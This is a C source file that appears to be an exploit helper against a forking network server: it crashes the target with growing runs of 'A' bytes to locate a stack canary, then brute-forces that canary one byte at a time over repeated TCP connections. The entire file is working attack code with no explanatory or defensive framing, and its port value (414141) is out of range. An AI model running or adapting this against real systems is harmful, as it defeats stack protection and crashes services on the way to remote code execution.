#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>

static int open_connection(in_addr_t dip, int dport)
{
   int pconn, opt = 1;
   struct sockaddr_in cdata;
   struct timeval timeout;

   /* timeout.tv_sec  = _opts.timeout; */
   timeout.tv_sec  = 8;
   timeout.tv_usec = 0;

   /* Set socket options and create it */
   cdata.sin_addr.s_addr = dip;
   cdata.sin_port = htons(dport);
   cdata.sin_family = AF_INET;

   pconn = socket(AF_INET, SOCK_STREAM, 0);
   
   if( pconn < 0 ) {
      printf("Socket error: %i\n", pconn);
      printf("Err message: %s\n", strerror(errno));
      return -1;
   }

   /* Set socket timeout */
   if ( setsockopt(pconn, SOL_SOCKET, SO_RCVTIMEO,
           (void *)&timeout, sizeof(struct timeval)) != 0)
      perror("setsockopt SO_RCVTIMEO: ");
   
   /* Set socket options */
   if ( setsockopt(pconn, SOL_SOCKET, SO_SNDTIMEO,
           (void *)&timeout, sizeof(struct timeval)) != 0)
      perror("setsockopt SO_SNDTIMEO: ");

  setsockopt(pconn, SOL_TCP, TCP_NODELAY, &opt, sizeof(opt));
      

   /* Make connection */
   if (connect(pconn,(struct sockaddr *) &cdata, sizeof(cdata)) != 0) {
      close(pconn);
      return -1;
   }
   
   return pconn;
}

int get_cookie_position(in_addr_t host)
{
    int x, fd, res;
    char lbuffer[1024], rbuffer[1024];

    memset(lbuffer, 'A', sizeof(lbuffer));

    for (x=1; x<sizeof(lbuffer); x++) {

        //printf("Checking cookie at: %d\n", x);

        /* Make a new connection */
         if ((fd = open_connection(host, 414141)) >= 0) {
            res = write(fd, lbuffer, x);
            if (res != x) {
               printf("\n[-] Error writing request...\n");
               exit(1);
            }

            res = read(fd, rbuffer, sizeof(rbuffer));
            //printf("\nRead: %d\n", res);
            //write(1, rbuffer, res);

            res = read(fd, rbuffer, sizeof(rbuffer));
            //printf("\nRead: %d\n", res);
            //write(1, rbuffer, res);

            res = read(fd, rbuffer, sizeof(rbuffer));
            //printf("\nRead: %d\n", res);
            //write(1, rbuffer, res);

            close(fd);

            /* 
             * Read response
             * If Read is <= 0, the served crashed so bad cookie
             */
            if (res <= 0)
               return x;

         } else {
            printf("Error connecting\n");
            exit(1);
         }

    }

    return -1;
}


void bruteforce_cookie(in_addr_t host, int len)
{
    int conn, offset, res;
    uint32_t cookie;
    char buffer[8192];
    char rbuffer[8192];

    cookie = 0;
    memset(buffer, 'A', sizeof(buffer));

    for (offset = 0; offset < 4; offset++) {
        for (;;) {
            printf("\r[+] Testing cookie: 0x%08X", cookie);
            fflush(stdout);

            memcpy(buffer+len, &cookie, offset+1);

                     /* Make a new connection */
             if ((conn = open_connection(host, 414141)) >= 0) {

                /* Send the request */
                res = write(conn, buffer, len+offset+1);
                if (res != len+offset+1) {
                   printf("\n[-] Error writing request...\n");
                   exit(1);
                }

                /* 
                 * Read response
                 * If Read is < 0, the served crashed so bad cookie
                 */
                res = read(conn, rbuffer, sizeof(rbuffer));
                res = read(conn, rbuffer, sizeof(rbuffer));
                res = read(conn, rbuffer, sizeof(rbuffer));
                close(conn);
                if (res > 0)
                   break;

             } else {
                printf("\n[-] Error connecting...\n");
                exit(1);
             }


             /* Check if valid value */
             if (((uint8_t *)(&cookie))[offset] == 255) {
                printf("\n[-] Cookie not found...\n");
                exit(1);
             } else {
                ((uint8_t *)(&cookie))[offset]++;;
             }
        }
    }

    printf("\nDone\n");
}


int main(int argc, char const *argv[])
{
    int pos;
    in_addr_t host;
    host = inet_addr(argv[1]);

    pos = get_cookie_position(host);
    if (pos == -1) {
        printf("Could not get cookie pos\n");
        return 1;
    }
    printf("Cookie overwriten at %d bytes\n", pos);
    bruteforce_cookie(host, pos-1);

    return 0;
}
